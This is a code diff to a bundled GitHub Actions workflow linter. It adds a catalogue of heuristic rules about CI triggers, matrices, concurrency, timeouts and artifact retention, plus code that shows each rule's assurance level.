+        "rationale": "Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/frequent-schedule",
+      "metadataSha256": "10b23fc914d906a23c305e87b7ae85dff80232c3efc17a57ad38acf9dfadeaa3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Avoid scheduled workflows that run more often than every 15 minutes."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/missing-job-condition-matrix",
+      "metadataSha256": "8c746eff9771a9cdb441586364332bab57d3001ae9bff91d18e1be09cfea3523",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Gate matrix jobs on the workflow's existing change-detection job."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/noisy-pr-types",
+      "metadataSha256": "00eb7e3610794928c5924c8bda6f139fc0e2ce266d9927baf12980b7532aa16d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Do not re-run build and test workflows on pull request metadata events such as labels or edits."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/serialized-matrix",
+      "metadataSha256": "b5d723734a709d1c85365117ffae98aaca1c8547b6144b668c354a1a0733a847",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Avoid throttling a matrix with a `max-parallel` far below its number of legs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/shard-fail-fast",
+      "metadataSha256": "e005d8949e84b82d1417300d6d2e82cbd21f0ea5495d8f0bb86979ead0e8c9b1",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Let sharded pull request test matrices stop early when one shard fails."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/workflow-run-chain",
+      "metadataSha256": "b06d23c5a864c90e785f4818e6f5612f4a18512d1062fd5547805c48f29454cc",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A completed `workflow_run` subscription waits for the upstream workflow, which may include jobs the follow-up does not need. A dependent job can express narrower prerequisites, but it still has scheduling and runner costs; consolidation does not guarantee a faster run. Preserve deliberate privilege boundaries, trigger semantics and artifact dependencies, then measure whether the changed dependency graph reduces waiting."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/artifact-retention",
+      "metadataSha256": "bf8ef49653bcab05950fdb34bf5e07cea531a8ab22c56e9ec32319fb4e0559be",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Uploaded artifacts should set a short `retention-days` instead of the repository default."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Artifacts are kept for the repository default (90 days unless changed) and count against Actions storage. Agent-driven repositories produce many runs per day, so build outputs that only feed later jobs pile up quickly; a short retention keeps storage and quota headroom without slowing anything down."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/concurrency",
+      "metadataSha256": "a936c1f146e39da184e57ebaa76bbe9c79202bc21988104cfe8644d69d41d1b7",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Pull request workflows should cancel superseded runs; deploy workflows must not."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Agents push many small commits. Without a concurrency group every push keeps running to completion, wasting runner minutes and delaying feedback. Deploy and release workflows must never cancel in-progress runs."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/duplicate-push-pull-request-trigger",
+      "metadataSha256": "f9fb7e184757da5548549558f343f7b0a7a839a9936bdcfb0f7af05ade9faead",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A workflow accepting both broad `push` and `pull_request` events may repeat overlapping work for same-repository pull requests."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A push to an open same-repository pull request can trigger both push and pull_request runs. They are not equivalent: push usually checks the branch tip, while pull_request checks a synthetic merge commit, and event conditions, paths, permissions and required checks can differ. Review whether that overlap is intentional. Restricting push changes branch and tag coverage, so this rule never edits triggers automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/job-timeout",
+      "metadataSha256": "a105cc8bd3a00211388e9472553955a48adce0201dd628d6353d587630200ebe",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs should set `timeout-minutes` well below the 360 minute default."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A hung job holds a runner (and every dependent job, merge queue entry, and agent loop) for up to six hours. A tight timeout turns hangs into fast, retryable failures."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/larger-runner-unjustified",
+      "metadataSha256": "de588372415dd95606e2ae553f66b5eaa811ad77363051b32ddc07a606bd3155",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A job on a larger (multi-core or macOS large) runner that only checks out, sets up tools, installs and runs formatters or linters."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A larger-looking runner label and familiar setup/lint commands do not establish resource needs or actual billing. Install hooks, native compilation, repository size, memory, networking and private runner policy can justify the selection. Compare representative end-to-end time, CPU/memory and current account pricing before downsizing. This is a measurement prompt, not proof of wasted cost."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/matrix-explosion",
+      "metadataSha256": "532ed6a978eb9767b1e6aac6f29bfdcca83c75811b2484aba039a234caa2af06",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A `strategy.matrix` whose version and runner dimensions multiply past the configured job budget, or past GitHub's 256-job limit."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A matrix runs jobs for its dimension combinations and can increase runner usage and queueing. GitHub limits a matrix to 256 jobs. A configured budget is an engineering preference, not evidence that intermediate versions are redundant: reducing version coverage can miss version-specific regressions. Suggested smaller matrices preserve all categorical and shard combinations on every retained runner, but deliberately reduce version combinations and require a coverage decision. Existing include/exclude rules are never replaced automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/merge-group",
+      "metadataSha256": "fd1b482ad7230d79e30bfab8bd6a71e0c0d1b67e576e4d3d3e75dcb87b069cde",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI workflows that run on `pull_request` should also run on `merge_group`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Agent-heavy repositories open and merge many pull requests at once, so a merge queue is the only practical way to keep the default branch green without serial rebases. A merge queue waits for the required checks to report on the `merge_group` event; a required-check workflow that only listens to `pull_request` never runs there, so queued pull requests stall until they time out."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/outdated-action-major",
+      "metadataSha256": "95735ac8f1530804c7139c91bc076f0a24b11048293d23a230cde9846e16d29d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Well-known actions should use their current major version, and local JavaScript actions should run on node24."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The maintained major/runtime table identifies releases to review for runtime support, security and performance changes. Newer majors can introduce breaking changes and are not guaranteed faster. Check the pinned action's source and release notes, target runner requirements and GitHub Enterprise Server support before upgrading; the table does not establish how an arbitrary pinned release was tested or executed."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/setup-action-missing-version-file",
+      "metadataSha256": "16b2371cffb2aad95c42991fc4c25d9f87d15c24e1b8dac615009c3f8a245880",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Language setup actions (setup-node, setup-python, setup-go, setup-dotnet) should pin the toolchain with a version input or the repository's version file."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without explicit version inputs or supported implicit version files, setup actions generally fall back to pre-installed toolchains. Hosted image updates or custom runner provisioning may then change the selected version. Reusing the project's supported version file can align CI and local development, but version ranges, aliases and .NET roll-forward policies still permit different releases. A version input is not a hermetic-build guarantee. Selecting a toolchain can change behavior and therefore is never automatically applied."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/unnecessary-needs-serialization",
+      "metadataSha256": "9143b14d0c549600f73490e06eaf2c71ec78153972d23bbf6219c014048d0949",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review `needs` edges without a recognized data transfer; they still provide success gating."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Hosted jobs do not share their ordinary filesystem merely because one needs another. Outputs, artifacts, caches and external systems can transfer data. Even without data transfer, needs provides ordering and success/skip/failure gating; an installation can intentionally validate dependencies or have external side effects. This insight identifies no recognized data transfer, not a redundant edge. Removing it changes behavior and requires an explicit decision about gating and concurrency."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    }
+  ]
+};
+
+// src/lint/assurance.ts
+var entries2 = new Map(RULE_ASSURANCE.rules.map((entry2) => [entry2.id, entry2]));
+function ruleAssurance(id) {
+  const entry2 = entries2.get(id);
+  if (!entry2) throw new Error(`Missing explicit assurance catalogue entry for built-in rule "${id}".`);
+  return entry2;
+}
+function assuranceText(id) {
+  const entry2 = ruleAssurance(id);
+  return `Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.${entry2.optionalModelCertificates.length ? " Optional cache-key certificates prove only the declared-dependency string-partition model." : ""}`;
+}
+
+// src/lint/workspace.ts
 var LintInputError = class extends Error {
   name = "LintInputError";
 };
@@ -68692,6 +75182,7 @@ function explainRuleText(id, rules15, severities) {
     `  Presets:   ${meta3.presets.length > 0 ? meta3.presets.join(", ") : "(none)"}`,
     `  Fixable:   ${meta3.fixable ? "yes" : "no"}`,
     `  Impact:    ${meta3.impact}`,
+    `  Assurance: ${allRules.some((candidate) => candidate.meta.id === id) ? assuranceText(id) : "Local rule: not covered by the built-in assurance catalogue."}`,
     ...meta3.requires.length > 0 ? [`  Requires:  ${meta3.requires.join(", ")}`] : [],
     "",
     meta3.description
@@ -69067,7 +75558,7 @@ async function readBoundedFile(root2, path, limit, signal) {
   }
 }
 async function loadAgentDirectory(root2, config2, signal) {
-  const entries2 = [];
+  const entries3 = [];
   let visited = 0;
   let complete = true;
   async function walk2(directory, depth) {
@@ -69087,16 +75578,16 @@ async function loadAgentDirectory(root2, config2, signal) {
       }
       const full = join3(directory, entry2.name);
       if (entry2.isDirectory() && !SKIP_DIRS.has(entry2.name)) await walk2(full, depth + 1);
-      else if (entry2.isSymbolicLink()) entries2.push({ path: relative4(root2, full).split(sep2).join("/"), opaque: true });
+      else if (entry2.isSymbolicLink()) entries3.push({ path: relative4(root2, full).split(sep2).join("/"), opaque: true });
       else if (entry2.isFile()) {
         const path = relative4(root2, full).split(sep2).join("/");
-        if (isInventoryPath(path)) entries2.push({ path, size: (await lstat(full)).size });
+        if (isInventoryPath(path)) entries3.push({ path, size: (await lstat(full)).size });
       }
     }
   }
   await walk2(root2, 0);
   const limits = { maxFiles: Math.min(config2.limits.maxFiles, LIMITS.files), maxFileBytes: Math.min(config2.limits.maxFileBytes, LIMITS.fileBytes) };
-  const selected = selectInventory(entries2, { ...config2, limits });
+  const selected = selectInventory(entries3, { ...config2, limits });
   const truncated = new Set(selected.truncated);
   const files = [];
   let remaining = LIMITS.workspaceBytes;
@@ -70617,10 +77108,10 @@ function validateRule(entry2, value) {
     check: (context2) => check2.call(value, context2)
   };
 }
-async function loadLocalRules(root2, entries2, builtins) {
+async function loadLocalRules(root2, entries3, builtins) {
   const loaded = [];
   const builtinIds = new Set(builtins.map((rule) => rule.meta.id));
-  for (const entry2 of entries2) {
+  for (const entry2 of entries3) {
     const real = await resolveModule(root2, entry2);
     let module;
     try {
@@ -70775,7 +77266,11 @@ function extractUnusedFlag(args) {
 }
 function ruleListText(rules15) {
   const width = Math.max(...rules15.map((rule) => rule.meta.id.length));
-  return rules15.map((rule) => `${rule.meta.id.padEnd(width)}  ${rule.meta.defaultSeverity.padEnd(5)}  ${rule.meta.fixable ? "fix" : "   "}  ${rule.meta.description}`).join("\n");
+  return rules15.map((rule) => {
+    const builtin = allRules.some((candidate) => candidate.meta.id === rule.meta.id);
+    if (builtin) ruleAssurance(rule.meta.id);
+    return `${rule.meta.id.padEnd(width)}  ${rule.meta.defaultSeverity.padEnd(5)}  ${rule.meta.fixable ? "fix" : "   "}  ${rule.meta.description}  [${builtin ? "heuristic" : "local/unreviewed"}]`;
+  }).join("\n");
 }
 function invalidConfig(path, problems) {
   return new UsageError(`Invalid configuration ${path}:
